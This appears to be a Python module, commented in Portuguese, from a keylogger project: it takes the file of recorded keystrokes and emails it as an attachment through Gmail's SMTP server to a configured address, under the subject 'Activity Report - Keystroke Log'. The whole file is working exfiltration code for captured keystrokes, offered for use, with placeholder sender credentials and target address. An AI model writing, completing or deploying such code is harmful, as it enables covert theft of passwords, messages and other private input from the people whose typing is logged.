'''
# email_sender.py
# Módulo para enviar o log de teclas por e-mail

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# --- CONFIGURAÇÃO ---
# ATENÇÃO: Para um projeto real, NUNCA coloque senhas diretamente no código.
# Use variáveis de ambiente para proteger suas credenciais.
# Ex: email_remetente = os.environ.get('EMAIL_USER')
#     senha_remetente = os.environ.get('EMAIL_PASS')

email_remetente = "seu_email@gmail.com"  # O e-mail que vai enviar o log
senha_remetente = "sua_senha_de_app"      # Use uma "Senha de App" do Google, não sua senha principal!
email_destinatario = "email_alvo@exemplo.com" # O e-mail que vai receber o log

# Servidor SMTP do Gmail
servidor_smtp = "smtp.gmail.com"
porta_smtp = 587

def enviar_log_por_email(arquivo_log):
    """
    Envia o arquivo de log especificado como anexo por e-mail.
    """
    if not os.path.exists(arquivo_log):
        print(f"Aviso: Arquivo de log '{arquivo_log}' não encontrado para envio.")
        return

    # Cria a mensagem de e-mail
    msg = MIMEMultipart()
    msg['From'] = email_remetente
    msg['To'] = email_destinatario
    msg['Subject'] = "Relatório de Atividades - Log de Teclas"

    # Corpo do e-mail
    corpo = "Segue em anexo o log de atividades registrado."
    msg.attach(MIMEText(corpo, 'plain'))

    # Anexa o arquivo de log
    try:
        with open(arquivo_log, "rb") as anexo:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(anexo.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f"attachment; filename= {os.path.basename(arquivo_log)}",
            )
            msg.attach(part)
    except Exception as e:
        print(f"Erro ao anexar o arquivo: {e}")
        return

    # Envia o e-mail
    try:
        server = smtplib.SMTP(servidor_smtp, porta_smtp)
        server.starttls()  # Inicia a conexão segura
        server.login(email_remetente, senha_remetente)
        texto_email = msg.as_string()
        server.sendmail(email_remetente, email_destinatario, texto_email)
        server.quit()
        print(f"Log enviado com sucesso para {email_destinatario}!")
    except smtplib.SMTPAuthenticationError:
        print("Erro de autenticação. Verifique seu e-mail e senha de app.")
    except Exception as e:
        print(f"Ocorreu um erro ao enviar o e-mail: {e}")

if __name__ == '__main__':
    # Exemplo de uso para teste
    log_de_teste = "log_teste.txt"
    with open(log_de_teste, "w") as f:
        f.write("Isso é um teste de envio de log.\n")
    
    enviar_log_por_email(log_de_teste)
    os.remove(log_de_teste) # Limpa o arquivo de teste
'''
